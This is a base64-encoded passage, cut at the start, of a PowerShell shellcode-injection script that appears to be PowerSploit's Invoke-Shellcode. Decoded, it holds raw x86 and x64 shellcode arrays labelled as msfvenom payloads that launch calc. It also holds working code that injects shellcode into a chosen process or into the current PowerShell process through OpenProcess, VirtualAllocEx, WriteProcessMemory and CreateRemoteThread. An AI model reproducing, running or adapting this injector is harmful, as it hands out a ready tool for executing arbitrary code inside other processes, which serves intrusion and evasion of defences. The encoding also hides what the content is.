c1LDB4ZTIsMHg1OCwweDhiLDB4NTgsMHgyNCwweDAxLDB4ZDMsMHg2NiwweDhiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwYywweDRiLDB4OGIsMHg1OCwweDFjLDB4MDEsMHhkMywweDhiLDB4MDQsMHg4YiwweDAxLDB4ZDAsMHg4OSwweDQ0LDB4MjQsMHgyNCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NWIsMHg1YiwweDYxLDB4NTksMHg1YSwweDUxLDB4ZmYsMHhlMCwweDU4LDB4NWYsMHg1YSwweDhiLDB4MTIsMHhlYiwweDg2LDB4NWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDZhLDB4MDEsMHg4ZCwweDg1LDB4YjksMHgwMCwweDAwLDB4MDAsMHg1MCwweDY4LDB4MzEsMHg4YiwweDZmLDB4ODcsMHhmZiwweGQ1LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhiYiwweGUwLDB4MWQsMHgyYSwweDBhLDB4NjgsMHhhNiwweDk1LDB4YmQsMHg5ZCwweGZmLDB4ZDUsMHgzYywweDA2LDB4N2MsMHgwYSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4ODAsMHhmYiwweGUwLDB4NzUsMHgwNSwweGJiLDB4NDcsMHgxMywweDcyLDB4NmYsMHg2YSwweDAwLDB4NTMsMHhmZiwweGQ1LDB4NjMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDYxLDB4NmMsMHg2MywweDAwKQoKICAgICAgICAjIDY0LWJpdCBQbAogICAgICAgICMgbXNmUGwgd2luZG93cy94NjQvZXhlYyBDTUQ9ImNhbGMiIEVYSVRGVU5DPXRocmVhZAogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGU2NCA9IEAoMHhmYywweDQ4LDB4ODMsMHhlNCwweGYwLDB4ZTgsMHhjMCwweDAwLDB4MDAsMHgwMCwweDQxLDB4NTEsMHg0MSwweDUwLDB4NTIsMHg1MSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTYsMHg0OCwweDMxLDB4ZDIsMHg2NSwweDQ4LDB4OGIsMHg1MiwweDYwLDB4NDgsMHg4YiwweDUyLDB4MTgsMHg0OCwweDhiLDB4NTIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDIwLDB4NDgsMHg4YiwweDcyLDB4NTAsMHg0OCwweDBmLDB4YjcsMHg0YSwweDRhLDB4NGQsMHgzMSwweGM5LDB4NDgsMHgzMSwweGMwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhhYywweDNjLDB4NjEsMHg3YywweDAyLDB4MmMsMHgyMCwweDQxLDB4YzEsMHhjOSwweDBkLDB4NDEsMHgwMSwweGMxLDB4ZTIsMHhlZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTIsMHg0MSwweDUxLDB4NDgsMHg4YiwweDUyLDB4MjAsMHg4YiwweDQyLDB4M2MsMHg0OCwweDAxLDB4ZDAsMHg4YiwweDgwLDB4ODgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDQ4LDB4ODUsMHhjMCwweDc0LDB4NjcsMHg0OCwweDAxLDB4ZDAsMHg1MCwweDhiLDB4NDgsMHgxOCwweDQ0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4YiwweDQwLDB4MjAsMHg0OSwweDAxLDB4ZDAsMHhlMywweDU2LDB4NDgsMHhmZiwweGM5LDB4NDEsMHg4YiwweDM0LDB4ODgsMHg0OCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHhkNiwweDRkLDB4MzEsMHhjOSwweDQ4LDB4MzEsMHhjMCwweGFjLDB4NDEsMHhjMSwweGM5LDB4MGQsMHg0MSwweDAxLDB4YzEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDM4LDB4ZTAsMHg3NSwweGYxLDB4NGMsMHgwMywweDRjLDB4MjQsMHgwOCwweDQ1LDB4MzksMHhkMSwweDc1LDB4ZDgsMHg1OCwweDQ0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4YiwweDQwLDB4MjQsMHg0OSwweDAxLDB4ZDAsMHg2NiwweDQxLDB4OGIsMHgwYywweDQ4LDB4NDQsMHg4YiwweDQwLDB4MWMsMHg0OSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHhkMCwweDQxLDB4OGIsMHgwNCwweDg4LDB4NDgsMHgwMSwweGQwLDB4NDEsMHg1OCwweDQxLDB4NTgsMHg1ZSwweDU5LDB4NWEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDQxLDB4NTgsMHg0MSwweDU5LDB4NDEsMHg1YSwweDQ4LDB4ODMsMHhlYywweDIwLDB4NDEsMHg1MiwweGZmLDB4ZTAsMHg1OCwweDQxLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg1OSwweDVhLDB4NDgsMHg4YiwweDEyLDB4ZTksMHg1NywweGZmLDB4ZmYsMHhmZiwweDVkLDB4NDgsMHhiYSwweDAxLDB4MDAsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDQ4LDB4OGQsMHg4ZCwweDAxLDB4MDEsMHgwMCwweDAwLDB4NDEsMHhiYSwweDMxLDB4OGIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDZmLDB4ODcsMHhmZiwweGQ1LDB4YmIsMHhlMCwweDFkLDB4MmEsMHgwYSwweDQxLDB4YmEsMHhhNiwweDk1LDB4YmQsMHg5ZCwweGZmLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhkNSwweDQ4LDB4ODMsMHhjNCwweDI4LDB4M2MsMHgwNiwweDdjLDB4MGEsMHg4MCwweGZiLDB4ZTAsMHg3NSwweDA1LDB4YmIsMHg0NywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTMsMHg3MiwweDZmLDB4NmEsMHgwMCwweDU5LDB4NDEsMHg4OSwweGRhLDB4ZmYsMHhkNSwweDYzLDB4NjEsMHg2YywweDYzLDB4MDApCiAgICB9CgogICAgaWYgKCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb2Nlc3NJRCddICkKICAgIHsKICAgICAgICAjIEluamVjdCBzaGVsbGNvZGUgaW50byB0aGUgc3BlY2lmaWVkIHByb2Nlc3MgSUQKICAgICAgICAkT3BlblByb2Nlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBPcGVuUHJvY2VzcwogICAgICAgICRPcGVuUHJvY2Vzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtVSW50MzJdLCBbQm9vbF0sIFtVSW50MzJdKSAoW0ludFB0cl0pCiAgICAgICAgJE9wZW5Qcm9jZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJE9wZW5Qcm9jZXNzQWRkciwgJE9wZW5Qcm9jZXNzRGVsZWdhdGUpCiAgICAgICAgJFZpcnR1YWxBbGxvY0V4QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgVmlydHVhbEFsbG9jRXgKICAgICAgICAkVmlydHVhbEFsbG9jRXhEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVaW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0pIChbSW50UHRyXSkKICAgICAgICAkVmlydHVhbEFsbG9jRXggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEFsbG9jRXhBZGRyLCAkVmlydHVhbEFsbG9jRXhEZWxlZ2F0ZSkKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5QWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgV3JpdGVQcm9jZXNzTWVtb3J5CiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeURlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50UHRyXSwgW0J5dGVbXV0sIFtVSW50MzJdLCBbVUludDMyXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKCRXcml0ZVByb2Nlc3NNZW1vcnlBZGRyLCAkV3JpdGVQcm9jZXNzTWVtb3J5RGVsZWdhdGUpCiAgICAgICAgJENyZWF0ZVJlbW90ZVRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENyZWF0ZVJlbW90ZVRocmVhZAogICAgICAgICRDcmVhdGVSZW1vdGVUaHJlYWREZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSwgW0ludFB0cl0sIFtVSW50MzJdLCBbSW50UHRyXSkgKFtJbnRQdHJdKQogICAgICAgICRDcmVhdGVSZW1vdGVUaHJlYWQgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkQ3JlYXRlUmVtb3RlVGhyZWFkQWRkciwgJENyZWF0ZVJlbW90ZVRocmVhZERlbGVnYXRlKQogICAgICAgICRDbG9zZUhhbmRsZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIENsb3NlSGFuZGxlCiAgICAgICAgJENsb3NlSGFuZGxlRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0pIChbQm9vbF0pCiAgICAgICAgJENsb3NlSGFuZGxlID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENsb3NlSGFuZGxlQWRkciwgJENsb3NlSGFuZGxlRGVsZWdhdGUpCiAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJJbmplY3Rpbmcgc2hlbGxjb2RlIGludG8gUElEOiAkUHJvY2Vzc0lkIgogICAgICAgIAogICAgICAgIGlmICggJEZvcmNlIC1vciAkcHNDbWRsZXQuU2hvdWxkQ29udGludWUoICdEbyB5b3Ugd2lzaCB0byBjYXJyeSBvdXQgeW91ciBldmlsIHBsYW5zPycsCiAgICAgICAgICAgICAgICAgIkluamVjdGluZyBzaGVsbGNvZGUgaW5qZWN0aW5nIGludG8gJCgoR2V0LVByb2Nlc3MgLUlkICRQcm9jZXNzSWQpLlByb2Nlc3NOYW1lKSAoJFByb2Nlc3NJZCkhIiApICkKICAgICAgICB7CiAgICAgICAgICAgIEluamVjdC1SZW1vdGVTaGVsbGNvZGUgJFByb2Nlc3NJZAogICAgICAgIH0KICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAjIEluamVjdCBzaGVsbGNvZGUgaW50byB0aGUgY3VycmVudGx5IHJ1bm5pbmcgUG93ZXJTaGVsbCBwcm9jZXNzCiAgICAgICAgJFZpcnR1YWxBbGxvY0FkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxBbGxvYwogICAgICAgICRWaXJ0dWFsQWxsb2NEZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtVSW50MzJdLCBbVUludDMyXSkgKFtJbnRQdHJdKQogICAgICAgICRWaXJ0dWFsQWxsb2MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEFsbG9jQWRkciwgJFZpcnR1YWxBbGxvY0RlbGVnYXRlKQogICAgICAgICRWaXJ0dWFsRnJlZUFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFZpcnR1YWxGcmVlCiAgICAgICAgJFZpcnR1YWxGcmVlRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtVaW50MzJdLCBbVUludDMyXSkgKFtCb29sXSkKICAgICAgICAkVmlydHVhbEZyZWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkVmlydHVhbEZyZWVBZGRyLCAkVmlydHVhbEZyZWVEZWxlZ2F0ZSkKICAgICAgICAkQ3JlYXRlVGhyZWFkQWRkciA9IEdldC1Qcm9jQWRkcmVzcyBrZXJuZWwzMi5kbGwgQ3JlYXRlVGhyZWFkCiAgICAgICAgJENyZWF0ZVRocmVhZERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0sIFtJbnRQdHJdLCBbVUludDMyXSwgW0ludFB0cl0pIChbSW50UHRyXSkKICAgICAgICAkQ3JlYXRlVGhyZWFkID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJENyZWF0ZVRocmVhZEFkZHIsICRDcmVhdGVUaHJlYWREZWxlZ2F0ZSkKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIFdhaXRGb3JTaW5nbGVPYmplY3QKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdERlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbSW50MzJdKSAoW0ludF0pCiAgICAgICAgJFdhaXRGb3JTaW5nbGVPYmplY3QgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkV2FpdEZvclNpbmdsZU9iamVjdEFkZHIsICRXYWl0Rm9yU2luZ2xlT2JqZWN0RGVsZWdhdGUpCiAgICAgICAgCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiSW5qZWN0aW5nIHNoZWxsY29kZSBpbnRvIFBvd2VyU2hlbGwiCiAgICAgICAgCiAgICAgICAgaWYgKCAkRm9yY2UgLW9yICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggJ0RvIHlvdSB3aXNoIHRvIGNhcnJ5IG91dCB5b3VyIGV2aWwgcGxhbnM/JywKICAgICAgICAgICAgICAgICAiSW5qZWN0aW5nIHNoZWxsY29kZSBpbnRvIHRoZSBydW5uaW5nIFBvd2VyU2hlbGwgcHJvY2VzcyEiICkgKQogICAgICAgIHsKICAgICAgICAgICAgSW5qZWN0LUxvY2FsU2hlbGxjb2RlCiAgICAgICAgfQogICAgfQogICAgCn0=
